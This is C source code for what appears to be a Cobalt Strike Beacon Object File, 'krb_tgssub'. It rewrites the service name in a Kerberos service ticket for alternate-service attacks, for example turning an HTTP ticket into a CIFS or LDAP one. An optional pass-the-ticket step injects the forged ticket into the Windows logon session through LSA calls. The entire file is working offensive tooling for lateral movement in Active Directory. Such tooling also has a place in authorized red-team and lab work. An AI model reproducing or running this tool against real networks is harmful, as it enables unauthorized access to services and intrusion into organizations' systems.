/*
 * krb_tgssub - Substitute SPN in Service Tickets
 *
 * Modifies the service name (sname) in a service ticket for alternate
 * service attacks. Useful when you have a ticket for one service but
 * want to use it for another service on the same host.
 *
 * Usage: krb_tgssub /ticket:BASE64 /altservice:NEW_SPN [/ptt]
 *
 * Example: krb_tgssub /ticket:BASE64_HTTP_TICKET /altservice:cifs/server
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Find sname (service name) in ticket ASN.1 structure */
/* sname is typically at context tag [9] in KRB-CRED's TicketInfo */
static int find_sname_in_ticket(BYTE* data, size_t len, size_t* snameOffset, size_t* snameLen) {
    /* Look for context tag [9] which contains sname in EncKDCRepPart/TicketInfo */
    for (size_t i = 0; i < len - 4; i++) {
        /* Context tag [9] = 0xA9 */
        if (data[i] == 0xA9) {
            size_t offset = i + 1;
            size_t tagLen = asn1_decode_length(data, &offset);

            /* Verify it's a SEQUENCE (PrincipalName) */
            if (offset < len && data[offset] == ASN1_SEQUENCE) {
                *snameOffset = i;
                *snameLen = (offset - i) + tagLen;
                return 1;
            }
        }
    }
    return 0;
}

/* Build a new PrincipalName ASN.1 structure for the alternate service */
static size_t build_principal_name(const char* spn, BYTE* out, size_t maxLen) {
    KRB_BUFFER name, tmp, name_type, name_string, name_seq;
    char svc_name[128] = {0};
    char svc_host[256] = {0};
    char* slash;

    buf_init(&name, 512);
    buf_init(&tmp, 256);
    buf_init(&name_type, 16);
    buf_init(&name_string, 256);
    buf_init(&name_seq, 512);

    /* Parse SPN into service/host */
    slash = strchr(spn, '/');
    if (slash) {
        size_t svc_len = slash - spn;
        if (svc_len >= sizeof(svc_name)) svc_len = sizeof(svc_name) - 1;
        strncpy(svc_name, spn, svc_len);
        svc_name[svc_len] = '\0';
        strncpy(svc_host, slash + 1, sizeof(svc_host) - 1);
    } else {
        strncpy(svc_name, spn, sizeof(svc_name) - 1);
    }

    /* name-type [0] INTEGER (NT-SRV-INST = 2) */
    asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
    asn1_context_wrap(&name_seq, 0, &name_type);

    /* name-string [1] SEQUENCE OF GeneralString */
    asn1_encode_general_string(&tmp, svc_name);
    if (svc_host[0]) {
        KRB_BUFFER host_str;
        buf_init(&host_str, 256);
        asn1_encode_general_string(&host_str, svc_host);
        buf_append(&tmp, host_str.data, host_str.length);
        buf_free(&host_str);
    }
    asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
    asn1_context_wrap(&name_seq, 1, &name_string);


    asn1_wrap(&name, ASN1_SEQUENCE, &name_seq);

    size_t result = 0;
    if (name.length <= maxLen) {
        memcpy(out, name.data, name.length);
        result = name.length;
    }

    buf_free(&name);
    buf_free(&tmp);
    buf_free(&name_type);
    buf_free(&name_string);
    buf_free(&name_seq);

    return result;
}

/* Find and replace sname in KRB-CRED structure */
/* This looks for the sname in the unencrypted ticket portion */
static BYTE* substitute_sname(BYTE* ticket, size_t ticketLen, const char* newSpn,
                               size_t* newTicketLen, formatp* output) {
    /* KRB-CRED structure:
     * [0] pvno
     * [1] msg-type
     * [2] tickets SEQUENCE OF Ticket
     * [3] enc-part EncryptedData
     *
     * Inside Ticket:
     * [0] tkt-vno
     * [1] realm
     * [2] sname  <-- This is what we modify
     * [3] enc-part
     */

    size_t i = 0;
    int found = 0;
    size_t snameStart = 0, snameEnd = 0;

    /* Find context tag [2] for sname within a Ticket structure */
    /* We look for the pattern: 0xA2 (context [2]) followed by SEQUENCE */
    for (i = 0; i < ticketLen - 10; i++) {
        /* Look for Ticket structure start (APPLICATION 1) */
        if (ticket[i] == 0x61) {
            size_t ticketStart = i;
            size_t offset = i + 1;
            size_t ticketStructLen = asn1_decode_length(ticket, &offset);
            (void)ticketStructLen;

            /* Inside Ticket, look for [2] sname */
            for (size_t j = offset; j < ticketLen - 4 && j < offset + 200; j++) {
                if (ticket[j] == 0xA2) {
                    /* Found context [2] - check if it contains a PrincipalName */
                    size_t off2 = j + 1;
                    size_t len2 = asn1_decode_length(ticket, &off2);

                    if (off2 < ticketLen && ticket[off2] == ASN1_SEQUENCE) {
                        /* This looks like sname */
                        snameStart = j;
                        snameEnd = off2 + len2;
                        found = 1;
                        BeaconFormatPrintf(output, "[*] Found sname at offset %d (length %d)\n",
                            (int)snameStart, (int)(snameEnd - snameStart));
                        break;
                    }
                }
            }
            if (found) break;
        }
    }

    if (!found) {
        BeaconFormatPrintf(output, "[-] Could not locate sname in ticket structure\n");
        return NULL;
    }

    /* Build new sname */
    BYTE newSname[512];
    size_t newSnameLen = build_principal_name(newSpn, newSname, sizeof(newSname));
    if (newSnameLen == 0) {
        BeaconFormatPrintf(output, "[-] Failed to build new principal name\n");
        return NULL;
    }

    /* Build context wrapper [2] for new sname */
    KRB_BUFFER wrappedSname;
    buf_init(&wrappedSname, 512);

    KRB_BUFFER snameData;
    buf_init(&snameData, 512);
    buf_append(&snameData, newSname, newSnameLen);

    asn1_context_wrap(&wrappedSname, 2, &snameData);
    buf_free(&snameData);

    BeaconFormatPrintf(output, "[*] New sname structure: %d bytes\n", (int)wrappedSname.length);

    /* Calculate new ticket size */
    size_t oldSnameLen = snameEnd - snameStart;
    *newTicketLen = ticketLen - oldSnameLen + wrappedSname.length;

    BYTE* newTicket = (BYTE*)malloc(*newTicketLen + 100);  /* Extra space for safety */
    if (!newTicket) {
        buf_free(&wrappedSname);
        return NULL;
    }

    /* Copy: before sname + new sname + after sname */
    size_t pos = 0;
    memcpy(newTicket + pos, ticket, snameStart);
    pos += snameStart;

    memcpy(newTicket + pos, wrappedSname.data, wrappedSname.length);
    pos += wrappedSname.length;

    memcpy(newTicket + pos, ticket + snameEnd, ticketLen - snameEnd);
    pos += (ticketLen - snameEnd);

    *newTicketLen = pos;

    buf_free(&wrappedSname);

    /* Note: This modifies only the cleartext sname in the Ticket structure.
     * The encrypted portion (enc-part) still contains the original sname.
     * This works because KDCs validate against the encrypted sname,
     * but services may accept the ticket based on the cleartext sname.
     * For full substitution with re-encryption, the service key is needed.
     */

    return newTicket;
}

/* Extract original sname from ticket for display */
static void display_original_sname(BYTE* ticket, size_t ticketLen, formatp* output) {
    for (size_t i = 0; i < ticketLen - 10; i++) {
        if (ticket[i] == 0x61) {  /* APPLICATION 1 = Ticket */
            size_t offset = i + 1;
            size_t len = asn1_decode_length(ticket, &offset);
            (void)len;

            /* Look for [2] sname */
            for (size_t j = offset; j < ticketLen - 4 && j < offset + 200; j++) {
                if (ticket[j] == 0xA2) {
                    size_t off2 = j + 1;
                    size_t len2 = asn1_decode_length(ticket, &off2);
                    (void)len2;

                    if (off2 < ticketLen && ticket[off2] == ASN1_SEQUENCE) {
                        /* Parse PrincipalName */
                        size_t seqOff = off2 + 1;
                        size_t seqLen = asn1_decode_length(ticket, &seqOff);
                        (void)seqLen;

                        /* Skip [0] name-type, find [1] name-string */
                        for (size_t k = seqOff; k < off2 + len2 && k < ticketLen - 2; k++) {
                            if (ticket[k] == 0xA1) {
                                size_t strOff = k + 1;
                                size_t strLen = asn1_decode_length(ticket, &strOff);
                                (void)strLen;

                                if (strOff < ticketLen && ticket[strOff] == ASN1_SEQUENCE) {
                                    strOff++;
                                    asn1_decode_length(ticket, &strOff);

                                    /* Read GeneralStrings */
                                    char svcName[128] = {0};
                                    char hostName[256] = {0};
                                    int partNum = 0;

                                    while (strOff < ticketLen && ticket[strOff] == ASN1_GENERALSTRING) {
                                        strOff++;
                                        size_t gsLen = asn1_decode_length(ticket, &strOff);
                                        if (gsLen > 0 && strOff + gsLen <= ticketLen) {
                                            if (partNum == 0 && gsLen < sizeof(svcName)) {
                                                memcpy(svcName, ticket + strOff, gsLen);
                                                svcName[gsLen] = '\0';
                                            } else if (partNum == 1 && gsLen < sizeof(hostName)) {
                                                memcpy(hostName, ticket + strOff, gsLen);
                                                hostName[gsLen] = '\0';
                                            }
                                            strOff += gsLen;
                                            partNum++;
                                        } else break;
                                    }

                                    if (hostName[0]) {
                                        BeaconFormatPrintf(output, "[*] Original SPN: %s/%s\n", svcName, hostName);
                                    } else {
                                        BeaconFormatPrintf(output, "[*] Original SPN: %s\n", svcName);
                                    }
                                    return;
                                }
                            }
                        }
                    }
                }
            }
            break;
        }
    }
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ticket_b64 = NULL;
    char* altService = NULL;
    char* ptt = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: TGS Service Name Substitution\n\n");


    ticket_b64 = arg_get(&parser, "ticket");
    altService = arg_get(&parser, "altservice");
    ptt = arg_get(&parser, "ptt");

    if (!ticket_b64 || !altService) {
        BeaconFormatPrintf(&output, "[-] Error: /ticket:BASE64 and /altservice:SPN required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_tgssub /ticket:BASE64_SERVICE_TICKET /altservice:NEW_SPN [/ptt]\n\n");
        BeaconFormatPrintf(&output, "This tool substitutes the service name in a ticket for alternate service attacks.\n");
        BeaconFormatPrintf(&output, "Useful when you have a ticket for one service (e.g., HTTP) but want to use\n");
        BeaconFormatPrintf(&output, "it for another service (e.g., CIFS) on the same host.\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
        BeaconFormatPrintf(&output, "  krb_tgssub /ticket:BASE64 /altservice:cifs/server.domain.com\n");
        BeaconFormatPrintf(&output, "  krb_tgssub /ticket:BASE64 /altservice:ldap/dc01.domain.com /ptt\n\n");
        BeaconFormatPrintf(&output, "Note: This modifies the cleartext sname. The encrypted portion still\n");
        BeaconFormatPrintf(&output, "contains the original sname. Works when services don't validate.\n");
        goto cleanup;
    }


    size_t ticketLen;
    BYTE* ticket = b64_decode_alloc(ticket_b64, &ticketLen);
    if (!ticket) {
        BeaconFormatPrintf(&output, "[-] Failed to decode base64 ticket\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Decoded ticket: %d bytes\n", (int)ticketLen);

    /* Identify ticket type */
    if (ticket[0] == 0x76) {
        BeaconFormatPrintf(&output, "[*] Ticket format: KRB-CRED (kirbi)\n");
    } else if (ticket[0] == 0x61) {
        BeaconFormatPrintf(&output, "[*] Ticket format: Ticket\n");
    } else if (ticket[0] == 0x6D) {
        BeaconFormatPrintf(&output, "[*] Ticket format: TGS-REP\n");
    } else {
        BeaconFormatPrintf(&output, "[?] Unknown ticket format: 0x%02X\n", ticket[0]);
    }

    /* Display original sname */
    display_original_sname(ticket, ticketLen, &output);

    BeaconFormatPrintf(&output, "[*] New SPN: %s\n", altService);

    /* Perform substitution */
    size_t newTicketLen;
    BYTE* newTicket = substitute_sname(ticket, ticketLen, altService, &newTicketLen, &output);

    if (!newTicket) {
        BeaconFormatPrintf(&output, "[-] Failed to substitute sname\n");
        free(ticket);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Modified ticket: %d bytes\n", (int)newTicketLen);

    /* Output modified ticket */
    char* newTicket_b64 = b64_encode_alloc(newTicket, newTicketLen);
    if (newTicket_b64) {
        BeaconFormatPrintf(&output, "\n[*] Modified Ticket (base64):\n");
        size_t b64len = strlen(newTicket_b64);
        for (size_t i = 0; i < b64len; i += 76) {
            BeaconFormatPrintf(&output, "  %.76s\n", newTicket_b64 + i);
        }

        /* Pass-the-ticket if requested */
        if (ptt) {
            BeaconFormatPrintf(&output, "\n[*] Attempting to import modified ticket...\n");

            HANDLE hLsa = NULL;
            ULONG authPackage = 0;
            NTSTATUS status;
            LSA_STRING kerbName;

            status = SECUR32$LsaConnectUntrusted(&hLsa);
            if (status != 0) {
                BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%08X\n", status);
            } else {
                kerbName.Buffer = "kerberos";
                kerbName.Length = 8;
                kerbName.MaximumLength = 9;

                status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
                if (status != 0) {
                    BeaconFormatPrintf(&output, "[-] Failed to find Kerberos package: 0x%08X\n", status);
                } else {
                    /* Submit ticket */
                    KERB_SUBMIT_TKT_REQUEST* submitRequest;
                    ULONG requestSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + newTicketLen;
                    submitRequest = (KERB_SUBMIT_TKT_REQUEST*)malloc(requestSize);

                    if (submitRequest) {
                        memset(submitRequest, 0, sizeof(KERB_SUBMIT_TKT_REQUEST));
                        submitRequest->MessageType = KerbSubmitTicketMessage;
                        submitRequest->KerbCredSize = (ULONG)newTicketLen;
                        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
                        memcpy((BYTE*)submitRequest + sizeof(KERB_SUBMIT_TKT_REQUEST),
                               newTicket, newTicketLen);

                        PVOID response = NULL;
                        ULONG responseSize = 0;
                        NTSTATUS subStatus;

                        status = SECUR32$LsaCallAuthenticationPackage(
                            hLsa, authPackage, submitRequest, requestSize,
                            &response, &responseSize, &subStatus);

                        if (status == 0 && subStatus == 0) {
                            BeaconFormatPrintf(&output, "[+] Ticket successfully imported!\n");
                        } else {
                            BeaconFormatPrintf(&output, "[-] Ticket import failed: 0x%08X / 0x%08X\n",
                                status, subStatus);
                        }

                        if (response) SECUR32$LsaFreeReturnBuffer(response);
                        free(submitRequest);
                    }
                }
                SECUR32$LsaDeregisterLogonProcess(hLsa);
            }
        }

        free(newTicket_b64);
    }

    free(newTicket);
    free(ticket);

cleanup:
    if (ticket_b64) free(ticket_b64);
    if (altService) free(altService);
    if (ptt) free(ptt);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
